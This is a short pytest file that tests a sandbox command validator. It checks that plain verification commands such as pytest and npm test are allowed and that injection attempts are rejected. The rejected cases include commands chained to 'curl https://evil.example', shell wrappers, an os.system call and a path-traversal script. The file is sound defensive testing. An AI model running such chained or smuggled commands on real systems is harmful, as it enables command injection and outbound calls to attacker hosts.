import pytest

from loom.sandbox.command_policy import CommandPolicyError, validate_verification_command


def test_allows_basic_verification_commands():
    assert validate_verification_command("pytest") == ["pytest"]
    assert validate_verification_command("python -m pytest") == ["python", "-m", "pytest"]
    assert validate_verification_command("npm test") == ["npm", "test"]
    assert validate_verification_command("pytest tests/test_auth.py -q") == ["pytest", "tests/test_auth.py", "-q"]


@pytest.mark.parametrize(
    "command",
    [
        "pytest tests/test_auth.py && curl https://evil.example",
        "pytest tests/test_auth.py; curl https://evil.example",
        "pytest $(curl https://evil.example)",
        "sh -c 'pytest'",
        "bash -c 'pytest'",
        "python -c 'import os; os.system(\"id\")'",
        "python ../../outside.py",
        "npm run arbitrary-script",
        "curl https://evil.example",
    ],
)
def test_rejects_shell_escape_or_non_allowlisted_commands(command):
    with pytest.raises(CommandPolicyError):
        validate_verification_command(command)
